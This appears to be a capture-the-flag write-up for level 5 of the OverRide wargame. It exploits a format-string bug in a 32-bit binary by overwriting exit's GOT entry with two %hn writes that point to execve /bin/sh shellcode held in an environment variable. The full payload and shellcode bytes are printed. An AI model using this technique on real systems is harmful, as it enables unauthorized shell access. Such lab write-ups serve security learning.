# Level 5

Ah `printf`, don't we love it?

```shell
level05@OverRide:~$ ./level05 
%p
0x64
```
We have another 32bit program with vulnerable format strings on our hands.

Let's find where we control the buffer
```shell
level05@OverRide:~$ ./level05 < <(python -c 'print "BBBB" + "%p|"*10') 
bbbb0x64|0xf7fcfac0|0xf7ec3add|0xffffd6ef|0xffffd6ee|(nil)|0xffffffff|0xffffd774|0xf7fdb000|0x62626262|
```
Oh yeah, our uppercase characters get converted to lowercase, but we can see it's the 10th arg
```shell
level05@OverRide:~$ ./level05 < <(python -c 'print "0000%10$p"')
00000x30303030
```

Ok Let's find the value of `exit` to replace it in the GOT
```shell
level05@OverRide:~$ gdb ./level05                                    
(gdb) disas exit                  
Dump of assembler code for function exit@plt:                        
   0x08048370 <+0>:     jmp    *0x80497e0                            
   0x08048376 <+6>:     push   $0x18                                 
   0x0804837b <+11>:    jmp    0x8048330                             
End of assembler dump.            
```
`0x80497e0` is `exit` in the GOT

But this time we don't just have a function to call, what are we gonna do!
```shell
export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
Of course! Let's now get the address of our shellcode with some safety margin for good measure.
```shell
level05@OverRide:~$ gdb ./level05 
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) p (char*)getenv("PWN")
$1 = 0xffffdd10 "\220\220\220\220\220\220\220\220\220\220\220\220...
```
Let's add a good `0x64` just to be safe -> `0xFFFFDD74`
GOT exit -> `0x80497e0`
```shell
level05@OverRide:~$ ./level05   < <(python -c 'print "\xe0\x97\x04\x08" + "%{}$p".format(str(0xffffdd74)) + "%10$n"')
```
It doesn't work this time, the reason is that we just can't use such a big number of characters for padding. We'll have to split our writes between the higher and lower bytes, and use the modifier `h` to only write 2 bytes, like this:
```shell
level05@OverRide:~$ ./level05 < <(echo "AAAABBBB%10\$p%11\$p")
aaaabbbbb0x616161610x62626262
```

Which translates to:
`(GOT ADDR LO BYTES ADDR | GOT ADDR HI BYTES ADDR ) ` +
`(( % PADDING | LO BYTES OF PWN ADDR - 8 | THROWAWAY CONV) | ( % SRC | 10TH VALUE IN STACK | $hn WRITE 2 BYTES))` +
`(( % PADDING | HI BYTES OF PWN ADDR - LO BYTES | THROAWAY CONV) | (% SRC | 11TH VAL IN STACK | $hn WRITE 2 BYTES))`

Which should give us before conversions
`(0x80497E0 + 0x80497E2) + ( %(0xDD74-8)$x + %10$hn ) + ( %(0xFFFF-DD74)$x  + %11$hn)`

in python:
```python
"\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%{}c".format(0xdd74-8) + "%10$hn" + "%{}c".format(0xffff-0xdd74) + "%11$hn"
```

Let's try it
```shell
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%{}c".format(0xdd74-8) + "%10$hn" + "%{}c".format(0xffff-0xdd74) + "%11$hn"' ; cat ) | ./level05 

[...]
whoami
level06
```

What a handful!
